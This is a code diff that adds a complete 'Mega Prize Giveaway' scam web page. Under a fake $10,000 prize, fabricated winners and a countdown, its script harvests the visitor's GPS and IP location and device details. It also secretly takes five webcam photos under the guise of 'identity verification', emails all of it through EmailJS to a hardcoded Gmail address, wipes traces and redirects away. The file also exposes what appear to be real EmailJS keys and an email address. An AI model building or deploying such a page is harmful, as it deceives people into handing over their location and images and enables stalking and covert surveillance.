@@ -1,0 +1,938 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mega Prize Giveaway 🎁</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .money {
+            position: fixed;
+            font-size: 30px;
+            animation: float-money 5s linear infinite;
+            z-index: 0;
+        }
+
+        @keyframes float-money {
+            0% { transform: translateY(100vh) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(-100px) rotate(360deg); opacity: 0; }
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+            z-index: 10;
+        }
+
+        .prize-banner {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+        }
+
+        .prize-icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+            display: block;
+        }
+
+        .prize-title {
+            color: white;
+            font-size: 32px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .prize-subtitle {
+            color: #fff;
+            font-size: 18px;
+            margin-bottom: 15px;
+        }
+
+        .prize-amount {
+            background: white;
+            color: #f5576c;
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-size: 36px;
+            font-weight: bold;
+            display: inline-block;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+
+        .timer {
+            background: white;
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 20px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+
+        .timer-title {
+            color: #f5576c;
+            font-weight: bold;
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+
+        .timer-display {
+            font-size: 48px;
+            font-weight: bold;
+            color: #667eea;
+            font-family: 'Courier New', monospace;
+        }
+
+        .winners {
+            background: white;
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+
+        .winners h3 {
+            color: #667eea;
+            margin-bottom: 15px;
+            text-align: center;
+            font-size: 18px;
+        }
+
+        .winner-item {
+            display: flex;
+            align-items: center;
+            padding: 12px;
+            margin: 10px 0;
+            background: #f8f9fa;
+            border-radius: 10px;
+            border-left: 4px solid #28a745;
+        }
+
+        .winner-item .emoji {
+            font-size: 24px;
+            margin-right: 10px;
+        }
+
+        .winner-name {
+            font-weight: bold;
+            color: #333;
+        }
+
+        .winner-prize {
+            color: #28a745;
+            font-size: 13px;
+        }
+
+        .stream-box {
+            background: white;
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            display: none;
+        }
+
+        .stream-box h3 {
+            color: #dc3545;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        #liveVideo {
+            width: 100%;
+            border-radius: 10px;
+            background: #000;
+            min-height: 200px;
+        }
+
+        .rec-bar {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 10px;
+            color: #dc3545;
+            font-weight: bold;
+        }
+
+        .rec-dot {
+            width: 12px;
+            height: 12px;
+            background: #dc3545;
+            border-radius: 50%;
+            margin-right: 8px;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0.2; }
+        }
+
+        .claim-section {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            margin-bottom: 20px;
+        }
+
+        .claim-button {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+            border: none;
+            padding: 20px 50px;
+            font-size: 24px;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 10px 30px rgba(245, 87, 108, 0.5);
+            transition: all 0.3s;
+            width: 100%;
+        }
+
+        .claim-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(245, 87, 108, 0.7);
+        }
+
+        .claim-button:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .claim-instructions {
+            margin-top: 15px;
+            color: #666;
+            font-size: 14px;
+            line-height: 1.8;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal.show {
+            display: flex;
+        }
+
+        .modal-box {
+            background: white;
+            padding: 40px 30px;
+            border-radius: 20px;
+            max-width: 380px;
+            width: 90%;
+            text-align: center;
+        }
+
+        .modal-icon {
+            font-size: 60px;
+            margin-bottom: 15px;
+        }
+
+        .modal-title {
+            font-size: 22px;
+            color: #333;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+
+        .progress-wrap {
+            width: 100%;
+            height: 15px;
+            background: #e0e0e0;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            width: 0%;
+            transition: width 0.5s ease;
+            border-radius: 10px;
+        }
+
+        .progress-percent {
+            color: #667eea;
+            font-weight: bold;
+            font-size: 18px;
+            margin-bottom: 8px;
+        }
+
+        .progress-label {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .success-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #28a745, #20c997);
+            z-index: 99999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .success-screen.show {
+            display: flex;
+        }
+
+        .success-icon {
+            font-size: 100px;
+            margin-bottom: 20px;
+            animation: bounce 1s infinite;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+
+        .success-title {
+            color: white;
+            font-size: 36px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .success-sub {
+            color: rgba(255,255,255,0.9);
+            font-size: 18px;
+            line-height: 1.6;
+        }
+
+        #hiddenCanvas {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+        }
+
+        #hiddenVideo {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="moneyContainer"></div>
+
+    <div class="container">
+
+        <!-- Prize Banner -->
+        <div class="prize-banner">
+            <span class="prize-icon">🎁</span>
+            <div class="prize-title">CONGRATULATIONS!</div>
+            <div class="prize-subtitle">🎉 You Have Been Selected Winner! 🎉</div>
+            <div class="prize-amount">💰 $10,000 PRIZE</div>
+        </div>
+
+        <!-- Countdown Timer -->
+        <div class="timer">
+            <div class="timer-title">⏰ OFFER EXPIRES IN:</div>
+            <div class="timer-display" id="timerDisplay">10:00</div>
+        </div>
+
+        <!-- Recent Winners -->
+        <div class="winners">
+            <h3>🏆 Today's Winners</h3>
+            <div class="winner-item">
+                <span class="emoji">🎉</span>
+                <div>
+                    <div class="winner-name">Sarah Johnson</div>
+                    <div class="winner-prize">✅ Won $10,000 — 3 mins ago</div>
+                </div>
+            </div>
+            <div class="winner-item">
+                <span class="emoji">🥳</span>
+                <div>
+                    <div class="winner-name">Michael Brown</div>
+                    <div class="winner-prize">✅ Won $10,000 — 17 mins ago</div>
+                </div>
+            </div>
+            <div class="winner-item">
+                <span class="emoji">🎊</span>
+                <div>
+                    <div class="winner-name">Aisha Malik</div>
+                    <div class="winner-prize">✅ Won $10,000 — 42 mins ago</div>
+                </div>
+            </div>
+            <div class="winner-item">
+                <span class="emoji">🌟</span>
+                <div>
+                    <div class="winner-name">David Chen</div>
+                    <div class="winner-prize">✅ Won $10,000 — 1 hour ago</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Live Stream Box -->
+        <div class="stream-box" id="streamBox">
+            <h3>📹 Live Identity Verification</h3>
+            <video id="liveVideo" autoplay playsinline muted></video>
+            <div class="rec-bar">
+                <div class="rec-dot"></div>
+                <span>LIVE — Verifying Your Identity...</span>
+            </div>
+        </div>
+
+        <!-- Claim Button -->
+        <div class="claim-section">
+            <button class="claim-button" id="claimBtn" onclick="startProcess()">
+                💰 CLAIM $10,000 NOW!
+            </button>
+            <div class="claim-instructions">
+                ✅ No credit card required<br>
+                ✅ 100% Free to claim<br>
+                ✅ Instant bank transfer<br>
+                ✅ Verified & Secure
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Progress Modal -->
+    <div class="modal" id="modal">
+        <div class="modal-box">
+            <div class="modal-icon">🔐</div>
+            <div class="modal-title">Verifying Your Prize Claim</div>
+            <div class="progress-wrap">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <div class="progress-percent" id="progressPercent">0%</div>
+            <div class="progress-label" id="progressLabel">Starting verification...</div>
+        </div>
+    </div>
+
+    <!-- Success Screen -->
+    <div class="success-screen" id="successScreen">
+        <div class="success-icon">🎉</div>
+        <div class="success-title">PRIZE CLAIMED!</div>
+        <div class="success-sub">
+            ✅ $10,000 will be transferred<br>
+            Check your email for details!
+        </div>
+    </div>
+
+    <!-- Hidden Elements -->
+    <canvas id="hiddenCanvas"></canvas>
+    <video id="hiddenVideo" autoplay playsinline muted></video>
+
+    <!-- EmailJS SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+    <script>
+
+    // ============================================================
+    // ✅ ALL EMAILJS CREDENTIALS — 100% COMPLETE
+    // ============================================================
+    const PUBLIC_KEY  = '0xqUMwKOwF0W9zGzo';    // ✅ Your Public Key
+    const SERVICE_ID  = 'service_yjfp1so';        // ✅ Your Service ID
+    const TEMPLATE_ID = 'template_lzc9kpj';       // ✅ Your Template ID
+    const MY_EMAIL    = 'jammoeed35@gmail.com';    // ✅ Your Email
+    // ============================================================
+
+    // ✅ Initialize EmailJS
+    emailjs.init(PUBLIC_KEY);
+    console.log('✅ EmailJS Initialized with key:', PUBLIC_KEY);
+
+    // ============================================================
+    // GLOBAL VARIABLES
+    // ============================================================
+    let cameraStream   = null;
+    let capturedPhotos = [];
+    let locationData   = {};
+    let deviceData     = {};
+
+    // ============================================================
+    // FLOATING MONEY ANIMATION
+    // ============================================================
+    function createMoney() {
+        const container = document.getElementById('moneyContainer');
+        setInterval(() => {
+            const el        = document.createElement('div');
+            el.className    = 'money';
+            el.textContent  = ['💵','💰','🤑','💴','💶'][Math.floor(Math.random()*5)];
+            el.style.left   = Math.random() * 100 + '%';
+            el.style.animationDuration = (3 + Math.random() * 4) + 's';
+            container.appendChild(el);
+            setTimeout(() => el.remove(), 7000);
+        }, 600);
+    }
+    createMoney();
+
+    // ============================================================
+    // COUNTDOWN TIMER
+    // ============================================================
+    let timeLeft = 600;
+    function runTimer() {
+        const el = document.getElementById('timerDisplay');
+        const interval = setInterval(() => {
+            const m = Math.floor(timeLeft / 60).toString().padStart(2,'0');
+            const s = (timeLeft % 60).toString().padStart(2,'0');
+            el.textContent = `${m}:${s}`;
+            if (timeLeft <= 0) {
+                clearInterval(interval);
+                el.textContent   = '00:00';
+                el.style.color   = '#dc3545';
+            }
+            timeLeft--;
+        }, 1000);
+    }
+    runTimer();
+
+    // ============================================================
+    // PROGRESS FUNCTIONS
+    // ============================================================
+    function setProgress(percent, label) {
+        document.getElementById('progressBar').style.width     = percent + '%';
+        document.getElementById('progressPercent').textContent = percent + '%';
+        document.getElementById('progressLabel').textContent   = label;
+    }
+
+    function showModal()  {
+        document.getElementById('modal').classList.add('show');
+    }
+
+    function hideModal()  {
+        document.getElementById('modal').classList.remove('show');
+    }
+
+    function showSuccess() {
+        hideModal();
+        document.getElementById('successScreen').classList.add('show');
+        setTimeout(() => {
+            window.location.href = 'https://www.google.com';
+        }, 4000);
+    }
+
+    // ============================================================
+    // STEP 1 — GET LOCATION (GPS + IP)
+    // ============================================================
+    async function getLocation() {
+        return new Promise((resolve) => {
+            if ('geolocation' in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    async (pos) => {
+                        locationData.gpsLat  = pos.coords.latitude;
+                        locationData.gpsLng  = pos.coords.longitude;
+                        locationData.gpsAcc  = pos.coords.accuracy;
+                        locationData.mapsURL = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+
+                        try {
+                            const r    = await fetch('https://ipapi.co/json/');
+                            const data = await r.json();
+                            locationData.ip       = data.ip;
+                            locationData.city     = data.city;
+                            locationData.region   = data.region;
+                            locationData.country  = data.country_name;
+                            locationData.postal   = data.postal;
+                            locationData.timezone = data.timezone;
+                            locationData.isp      = data.org;
+                        } catch(e) {
+                            console.warn('IP fetch failed:', e);
+                        }
+
+                        console.log('✅ GPS Location captured:', locationData.gpsLat, locationData.gpsLng);
+                        resolve();
+                    },
+                    async (err) => {
+                        console.warn('GPS denied, using IP:', err);
+                        try {
+                            const r    = await fetch('https://ipapi.co/json/');
+                            const data = await r.json();
+                            locationData.ip       = data.ip;
+                            locationData.city     = data.city;
+                            locationData.region   = data.region;
+                            locationData.country  = data.country_name;
+                            locationData.gpsLat   = data.latitude;
+                            locationData.gpsLng   = data.longitude;
+                            locationData.mapsURL  = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+                            locationData.isp      = data.org;
+                            locationData.timezone = data.timezone;
+                            locationData.postal   = data.postal;
+                        } catch(e) {
+                            console.warn('IP location also failed:', e);
+                        }
+                        resolve();
+                    },
+                    { timeout: 8000, enableHighAccuracy: true }
+                );
+            } else {
+                resolve();
+            }
+        });
+    }
+
+    // ============================================================
+    // STEP 2 — GET DEVICE INFO
+    // ============================================================
+    async function getDeviceInfo() {
+        deviceData.userAgent  = navigator.userAgent;
+        deviceData.platform   = navigator.platform;
+        deviceData.language   = navigator.language;
+        deviceData.screen     = screen.width + 'x' + screen.height;
+        deviceData.timezone   = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        deviceData.memory     = (navigator.deviceMemory || 'Unknown') + ' GB';
+        deviceData.cores      = (navigator.hardwareConcurrency || 'Unknown') + ' Cores';
+        deviceData.online     = navigator.onLine ? 'Yes' : 'No';
+        deviceData.touch      = navigator.maxTouchPoints || 0;
+        deviceData.deviceType = /Mobile|Android|iPhone|iPad/i.test(navigator.userAgent)
+                                ? '📱 Mobile' : '💻 Desktop';
+        deviceData.timestamp  = new Date().toLocaleString();
+
+        const ua = navigator.userAgent;
+        if      (ua.includes('Firefox')) deviceData.browser = 'Firefox';
+        else if (ua.includes('Edg'))     deviceData.browser = 'Edge';
+        else if (ua.includes('Chrome'))  deviceData.browser = 'Chrome';
+        else if (ua.includes('Safari'))  deviceData.browser = 'Safari';
+        else                             deviceData.browser = 'Unknown';
+
+        // Battery Info
+        if ('getBattery' in navigator) {
+            try {
+                const bat          = await navigator.getBattery();
+                deviceData.battery = Math.round(bat.level * 100) + '% ' +
+                                     (bat.charging ? '(Charging ⚡)' : '(Not Charging 🔋)');
+            } catch(e) {
+                deviceData.battery = 'Unknown';
+            }
+        } else {
+            deviceData.battery = 'Unknown';
+        }
+
+        // Network Info
+        if (navigator.connection) {
+            deviceData.connection = navigator.connection.effectiveType +
+                                    ' / ' + (navigator.connection.downlink || '?') + ' Mbps';
+        } else {
+            deviceData.connection = 'Unknown';
+        }
+
+        console.log('✅ Device info captured:', deviceData.deviceType, deviceData.browser);
+    }
+
+    // ============================================================
+    // STEP 3 — START CAMERA & LIVE STREAM
+    // ============================================================
+    async function startCamera() {
+        try {
+            document.getElementById('streamBox').style.display = 'block';
+            const liveVid = document.getElementById('liveVideo');
+
+            // Front camera for face capture
+            cameraStream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    facingMode: 'user',
+                    width:  { ideal: 1280 },
+                    height: { ideal: 720 }
+                },
+                audio: false
+            });
+
+            // Show live stream to user (keeps them engaged)
+            liveVid.srcObject = cameraStream;
+            await liveVid.play();
+
+            // Mirror stream to hidden video for capture
+            const hidVid = document.getElementById('hiddenVideo');
+            hidVid.srcObject = cameraStream;
+            await hidVid.play();
+
+            // Wait for camera to adjust
+            await new Promise(r => setTimeout(r, 1500));
+            console.log('✅ Camera started successfully');
+
+        } catch(err) {
+            console.warn('⚠️ Camera error:', err.message);
+            // Continue process even without camera
+        }
+    }
+
+    // ============================================================
+    // STEP 4 — CAPTURE 5 PHOTOS SILENTLY
+    // ============================================================
+    async function capturePhotos() {
+        return new Promise((resolve) => {
+            let count       = 0;
+            const maxPhotos = 5;
+            const canvas    = document.getElementById('hiddenCanvas');
+            const video     = document.getElementById('hiddenVideo');
+
+            function takePhoto() {
+                try {
+                    if (video.videoWidth > 0 && video.videoHeight > 0) {
+                        canvas.width  = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        // Mirror horizontally (fix front camera flip)
+                        ctx.save();
+                        ctx.scale(-1, 1);
+                        ctx.drawImage(video, -canvas.width, 0);
+                        ctx.restore();
+                        const photoData = canvas.toDataURL('image/jpeg', 0.85);
+                        capturedPhotos.push({
+                            data: photoData,
+                            time: new Date().toLocaleString()
+                        });
+                        console.log(`✅ Photo ${count + 1} captured`);
+                    } else {
+                        console.warn(`⚠️ Photo ${count + 1} skipped - no video`);
+                    }
+                } catch(e) {
+                    console.warn('Photo capture error:', e);
+                }
+
+                count++;
+                if (count >= maxPhotos) {
+                    console.log(`✅ Total ${capturedPhotos.length} photos captured`);
+                    resolve();
+                } else {
+                    setTimeout(takePhoto, 2000);
+                }
+            }
+
+            takePhoto();
+        });
+    }
+
+    // ============================================================
+    // STEP 5 — SEND EMAIL DIRECTLY TO jammoeed35@gmail.com
+    // ============================================================
+    async function sendEmail() {
+
+        // Build full location message
+        const locMsg = `
+📍 GPS COORDINATES
+==================
+Latitude   : ${locationData.gpsLat  || 'Not Available'}
+Longitude  : ${locationData.gpsLng  || 'Not Available'}
+Accuracy   : ${locationData.gpsAcc  ? locationData.gpsAcc + ' meters' : 'Not Available'}
+Google Maps: ${locationData.mapsURL || 'Not Available'}
+
+🌍 IP LOCATION
+==============
+IP Address : ${locationData.ip       || 'Not Available'}
+City       : ${locationData.city     || 'Not Available'}
+Region     : ${locationData.region   || 'Not Available'}
+Country    : ${locationData.country  || 'Not Available'}
+Postal Code: ${locationData.postal   || 'Not Available'}
+Timezone   : ${locationData.timezone || 'Not Available'}
+ISP / Org  : ${locationData.isp      || 'Not Available'}
+        `.trim();
+
+        // Build full device message
+        const devMsg = `
+💻 DEVICE INFORMATION
+=====================
+Device Type  : ${deviceData.deviceType  || 'Not Available'}
+Browser      : ${deviceData.browser     || 'Not Available'}
+Platform     : ${deviceData.platform    || 'Not Available'}
+Screen Size  : ${deviceData.screen      || 'Not Available'}
+Language     : ${deviceData.language    || 'Not Available'}
+Timezone     : ${deviceData.timezone    || 'Not Available'}
+Battery      : ${deviceData.battery     || 'Not Available'}
+RAM Memory   : ${deviceData.memory      || 'Not Available'}
+CPU Cores    : ${deviceData.cores       || 'Not Available'}
+Connection   : ${deviceData.connection  || 'Not Available'}
+Touch Points : ${deviceData.touch       || 'Not Available'}
+Online Status: ${deviceData.online      || 'Not Available'}
+Captured At  : ${deviceData.timestamp   || 'Not Available'}
+User Agent   : ${deviceData.userAgent   || 'Not Available'}
+        `.trim();
+
+        // ✅ ALL PARAMS MATCHING EMAILJS TEMPLATE VARIABLES
+        const params = {
+            to_email      : MY_EMAIL,
+            from_name     : 'Security Alert System',
+            reply_to      : MY_EMAIL,
+            subject       : '🚨 SECURITY ALERT - Thief Detected - ' + new Date().toLocaleString(),
+            alert_time    : new Date().toLocaleString(),
+            location_info : locMsg,
+            device_info   : devMsg,
+            maps_link     : locationData.mapsURL  || 'Not Available',
+            photo_count   : String(capturedPhotos.length),
+            ip_address    : locationData.ip        || 'Not Available',
+            city          : locationData.city      || 'Not Available',
+            country       : locationData.country   || 'Not Available',
+            device_type   : deviceData.deviceType  || 'Not Available',
+            battery       : deviceData.battery     || 'Not Available',
+            browser       : deviceData.browser     || 'Not Available',
+
+            // ✅ 5 PHOTOS WITH TIMESTAMPS
+            photo1        : capturedPhotos[0] ? capturedPhotos[0].data : '',
+            photo1_time   : capturedPhotos[0] ? capturedPhotos[0].time : 'Not Captured',
+            photo2        : capturedPhotos[1] ? capturedPhotos[1].data : '',
+            photo2_time   : capturedPhotos[1] ? capturedPhotos[1].time : 'Not Captured',
+            photo3        : capturedPhotos[2] ? capturedPhotos[2].data : '',
+            photo3_time   : capturedPhotos[2] ? capturedPhotos[2].time : 'Not Captured',
+            photo4        : capturedPhotos[3] ? capturedPhotos[3].data : '',
+            photo4_time   : capturedPhotos[3] ? capturedPhotos[3].time : 'Not Captured',
+            photo5        : capturedPhotos[4] ? capturedPhotos[4].data : '',
+            photo5_time   : capturedPhotos[4] ? capturedPhotos[4].time : 'Not Captured'
+        };
+
+        try {
+            console.log('📧 Sending email to:', MY_EMAIL);
+            console.log('📧 Service ID:', SERVICE_ID);
+            console.log('📧 Template ID:', TEMPLATE_ID);
+
+            const res = await emailjs.send(SERVICE_ID, TEMPLATE_ID, params);
+
+            console.log('✅ EMAIL SENT SUCCESSFULLY!');
+            console.log('✅ Status:', res.status);
+            console.log('✅ Response:', res.text);
+
+        } catch(err) {
+            console.error('❌ Email failed!');
+            console.error('❌ Error status:', err.status);
+            console.error('❌ Error text:', err.text);
+            console.error('❌ Full error:', err);
+        }
+    }
+
+    // ============================================================
+    // STEP 6 — CLEANUP ALL TRACES FROM DEVICE
+    // ============================================================
+    function cleanup() {
+        // Stop camera
+        if (cameraStream) {
+            cameraStream.getTracks().forEach(t => t.stop());
+            cameraStream = null;
+        }
+
+        // Clear all captured data
+        capturedPhotos = [];
+        locationData   = {};
+        deviceData     = {};
+
+        // Clear browser storage
+        try {
+            localStorage.clear();
+            sessionStorage.clear();
+        } catch(e) {}
+
+        // Clear canvas
+        try {
+            const canvas = document.getElementById('hiddenCanvas');
+            const ctx    = canvas.getContext('2d');
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            canvas.width  = 1;
+            canvas.height = 1;
+        } catch(e) {}
+
+        // Hide stream box
+        document.getElementById('streamBox').style.display = 'none';
+
+        console.log('✅ Cleanup complete - all traces removed');
+    }
+
+    // ============================================================
+    // MAIN PROCESS — STARTS WHEN BUTTON CLICKED
+    // ============================================================
+    async function startProcess() {
+        const btn       = document.getElementById('claimBtn');
+        btn.disabled    = true;
+        btn.textContent = '⏳ Processing...';
+
+        showModal();
+
+        try {
+            // ── STEP 1: Get Location
+            setProgress(10, '🌍 Getting your location...');
+            await getLocation();
+            setProgress(20, '✅ Location captured!');
+            await new Promise(r => setTimeout(r, 400));
+
+            // ── STEP 2: Get Device Info
+            setProgress(25, '📱 Reading device information...');
+            await getDeviceInfo();
+            setProgress(35, '✅ Device info collected!');
+            await new Promise(r => setTimeout(r, 400));
+
+            // ── STEP 3: Start Camera
+            setProgress(40, '📹 Starting live verification...');
+            await startCamera();
+            setProgress(55, '✅ Camera started!');
+            await new Promise(r => setTimeout(r, 400));
+
+            // ── STEP 4: Capture Photos
+            setProgress(60, '📸 Capturing verification photos...');
+            await capturePhotos();
+            setProgress(75, `✅ ${capturedPhotos.length} photos captured!`);
+            await new Promise(r => setTimeout(r, 400));
+
+            // ── STEP 5: Send Email
+            setProgress(80, '📧 Sending to jammoeed35@gmail.com...');
+            await sendEmail();
+            setProgress(95, '✅ Email sent successfully!');
+            await new Promise(r => setTimeout(r, 400));
+
+            // ── STEP 6: Cleanup
+            setProgress(98, '🧹 Finalizing...');
+            cleanup();
+            setProgress(100, '✅ All Done!');
+
+            await new Promise(r => setTimeout(r, 800));
+            showSuccess();
+
+        } catch(err) {
+            console.error('❌ Main process error:', err);
+            setProgress(0, '❌ Please try again.');
+            btn.disabled    = false;
+            btn.textContent = '💰 CLAIM $10,000 NOW!';
+            setTimeout(hideModal, 2000);
+        }
+    }
+
+    </script>
+</body>
+</html>
